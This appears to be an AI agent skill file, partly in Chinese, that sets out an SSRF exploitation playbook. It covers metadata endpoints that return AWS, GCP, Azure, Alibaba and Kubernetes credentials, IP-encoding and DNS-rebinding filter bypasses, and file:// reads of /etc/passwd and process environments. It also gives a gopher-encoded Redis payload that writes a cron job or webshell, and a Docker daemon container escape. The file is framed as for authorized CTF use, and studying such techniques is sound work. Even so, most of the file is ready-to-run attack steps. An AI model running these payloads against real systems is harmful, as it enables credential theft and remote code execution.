name: ssrf-attack
description: SSRF exploitation playbook — find the URL-fetch surface, confirm it, bypass host/IP filters, hit cloud metadata, and chain gopher/file/dict schemes to internal services (Redis/Docker/Elasticsearch) for RCE. Covers blind SSRF and the filter-bypass decision tree. Use when the server fetches URLs, imports remote content, resolves hostnames, or can be driven toward internal networks.
---

# SSRF Attack Playbook

Authorized CTF/assessment use. SSRF is "the server makes the request, so it can reach what you can't". The value is reaching internal services + cloud metadata — not just the outward fetch. Confirm first, then escalate through the chain below.

## 1. Find the SSRF surface

Any parameter that carries a URL / host / IP:
```
url=  link=  src=  dest=  uri=  path=  endpoint=  callback=  imageUrl=
loc=  redirect=  load=  file=  resource=  data=  ref=  webhook=
```
Less obvious vectors: PDF/screenshot generators (URL to render), CSV/RSS import-by-URL, webhook config, OAuth redirect (server-side fetch), `X-Forwarded-Host`/`X-Real-IP` in proxy chains, XML `DOCTYPE` external entity, GraphQL `@link`.

## 2. Confirm (before escalating)

1. Point the param at your listener (collaborator/interact.sh). Outbound callback = confirmed SSRF.
2. No callback? Time-based: internal open port responds fast, closed port slow/reset — compare `:22` vs `:9999`.
3. Then probe localhost services: `127.0.0.1:8080`, `:22`, `:6379` (Redis), `:9200` (ES), `:2375` (Docker daemon — critical), `:9000/actuator`.

## 3. Cloud metadata (MUST-TRY when any SSRF confirmed)

```
AWS   http://169.254.169.254/latest/meta-data/iam/security-credentials/
      http://169.254.169.254/latest/user-data
GCP   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
      (header: Metadata-Flavor: Google)
Azure http://169.254.169.254/metadata/instance?api-version=2021-02-01
      (header: Metadata: true)
Alibaba http://100.100.100.200/latest/meta-data/ram/security-credentials/
K8s   http://kubernetes.default.svc/api/v1/namespaces/default/secrets
      file:///var/run/secrets/kubernetes.io/serviceaccount/token
```
AWS IMDSv2 needs a PUT to `/latest/api/token` first — if SSRF supports custom headers, do the token dance.

## 4. Host/IP filter bypass (the core of most CTF SSRF)

Blocked `127.0.0.1` / `localhost` / `169.254.169.254`? Re-encode:
```
127.0.0.1  → 127.1  127.0.1  0x7f000001  2130706433  [::1]  [::ffff:127.0.0.1]
             0177.0.0.1 (octal)  127.000.000.001
169.254.169.254 → 0xa9fea9fe  2852039166  0251.0376.0251.0376  [::ffff:169.254.169.254]
DNS rebinding: 127.0.0.1.nip.io / xip.io, or your own domain with TTL=0 (first lookup public, second internal)
Redirect chain: attacker.com → 302 → internal IP (if the fetcher follows redirects)
Username/prefix trick: http://allowed.com@127.0.0.1/
```
Decision: filter blocks a literal → change the ENCODING, not the target.

## 5. Scheme attacks (go beyond http://)

```
file:///etc/passwd            → local file read
file:///proc/self/environ     → env (DB creds, keys)
file:///proc/net/arp          → internal network map
dict://127.0.0.1:6379/INFO    → probe Redis
gopher://127.0.0.1:6379/_...  → full TCP payload injection (Redis/MySQL/FastCGI/SMTP)
```

### gopher → Redis → RCE (the flagship chain)
If Redis (6379) is reachable and unauthenticated, write a cron/webshell via gopher:
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24<len>%0D%0A<crontab-or-webshell>%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%24<len>%0D%0A<dir>%0D%0A...%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```
(Each Redis command is RESP-encoded; use Gopherus to generate. Target: set key → config set dir → config set dbfilename → save.)

## 6. Internal services worth hitting

- **Docker daemon 2375** (unauth): list containers, or create a privileged container mounting `/:/host` → read host files = escape.
- **Elasticsearch 9200**: `/_cat/indices`, `/INDEX/_search?q=*` → dump data/flag.
- **Spring actuator**: `:9000/actuator/env`, `/actuator/heapdump` → secrets.
- **Internal admin panels**: `:8080/admin`, `:8443/admin`.

## 7. Blind SSRF (no reflected content)

Use collaborator for the callback; if DNS-only, chain DNS rebinding or OOB exfil. Time/error differentials still reveal internal topology.

## Cross-cutting
- **Confirm → identify filter → re-encode → escalate.** Don't stop at "SSRF confirmed" — the flag is usually one hop deeper (metadata / Redis / internal admin).
- **gopher is the RCE enabler** — when it's allowed, SSRF stops being "read-only".
- Self-verify each hop (callback / banner / response) before the next.

## URL 解析器差异(SSRF 过滤绕过核心)

不同解析器对同一 URL 的理解不同——过滤器用一个 parser 检查"安全",实际请求库用另一个 parser 发送到"危险地址":

### 127.0.0.1 等价写法(逐一试)

```
http://127.0.0.1
http://0x7f000001          # hex
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://127.1               # 短格式
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv6-mapped IPv4
http://0                   # 某些系统=localhost
http://localhost
http://127.0.0.1.nip.io    # DNS 解析到 127.0.0.1
http://spoofed.burpcollaborator.net  # DNS rebinding
```

### 过滤绕过技巧

| 绕过目标 | 手法 |
|---|---|
| 域名黑名单 | `http://evil.com@safe.com/`(parser 差异) |
| IP 黑名单 | hex/octal/decimal/IPv6-mapped 编码 |
| 协议黑名单 | `gopher://` / `file:///` / `dict://` |
| 路径黑名单 | 双 URL 编码 `%252e%252e` / `..;/` |
| 重定向 | 你控制的 URL 302 到 `http://169.254.169.254` |
| DNS rebinding | 第一次解析到安全 IP(通过检查),第二次解析到内网 IP(实际请求) |

### 全云 metadata 端点速查

```bash
# AWS IMDSv1 (无需认证,最常考)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (需 header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (需 header: Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# 阿里云 (无需认证)
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# DigitalOcean (无需认证)
http://169.254.169.254/metadata/v1/user-data

# 通用内网探测
http://127.0.0.1:PORT    # 本机其他服务
http://内网IP:PORT       # 从报错/配置文件获取
file:///etc/passwd       # 本地文件读取
file:///proc/self/environ  # 环境变量(含 AK/SK)
```
